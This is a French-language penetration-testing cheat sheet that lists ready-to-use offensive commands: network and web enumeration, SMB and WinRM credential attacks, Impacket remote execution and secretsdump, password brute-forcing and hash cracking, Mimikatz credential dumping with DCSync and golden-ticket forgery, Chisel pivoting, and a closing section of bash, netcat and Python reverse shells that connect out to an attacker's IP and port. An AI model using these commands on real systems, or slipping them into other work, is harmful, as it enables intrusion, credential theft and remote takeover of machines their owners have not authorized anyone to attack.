# Cheat Sheet - Commandes Essentielles

## Nmap

```bash
nmap -sC -sV -oN scan.txt IP              # Standard
nmap -T4 -p- IP                            # Tous les ports
nmap -sU --top-ports 20 IP                 # UDP
nmap --script=vuln IP                      # Vuln scan
```

## Gobuster

```bash
gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
gobuster dns -d domaine.com -w wordlist.txt
gobuster vhost -u http://IP -w wordlist.txt
```

## Crackmapexec

```bash
crackmapexec smb IP -u user -p pass
crackmapexec smb IP -u user -H HASH
crackmapexec smb IP -u user -p pass --shares
crackmapexec smb IP -u user -p pass --sam
crackmapexec smb IP -u user -p pass -M spider_plus
crackmapexec winrm IP -u user -p pass
```

## Impacket

```bash
psexec.py domaine/user:pass@IP
wmiexec.py domaine/user:pass@IP
smbexec.py domaine/user:pass@IP
secretsdump.py domaine/user:pass@IP
GetUserSPNs.py domaine/user:pass -dc-ip DC_IP -request
GetNPUsers.py domaine/ -usersfile users.txt -dc-ip DC_IP
```

## Evil-WinRM

```bash
evil-winrm -i IP -u user -p pass
evil-winrm -i IP -u user -H HASH
```

## Hydra

```bash
hydra -l user -P wordlist ssh://IP
hydra -l user -P wordlist ftp://IP
hydra -l admin -P wordlist http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

## Hashcat

```bash
hashcat -m 0 hash wordlist        # MD5
hashcat -m 1000 hash wordlist     # NTLM
hashcat -m 1800 hash wordlist     # sha512crypt
hashcat -m 5600 hash wordlist     # NetNTLMv2
hashcat -m 13100 hash wordlist    # Kerberoast
hashcat -m 18200 hash wordlist    # AS-REP Roast
```

## Responder

```bash
responder -I eth0 -dwPv
```

## Mimikatz

```bash
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
lsadump::lsa /patch
lsadump::dcsync /domain:dom.com /user:Administrator
kerberos::golden /user:fake /domain:dom.com /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

## Chisel

```bash
# Serveur (attaquant)
chisel server --reverse -p 8000
# Client (pivot)
chisel client IP:8000 R:socks
```

## Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/IP/PORT 0>&1

# Netcat
nc -e /bin/bash IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

## Shell upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```
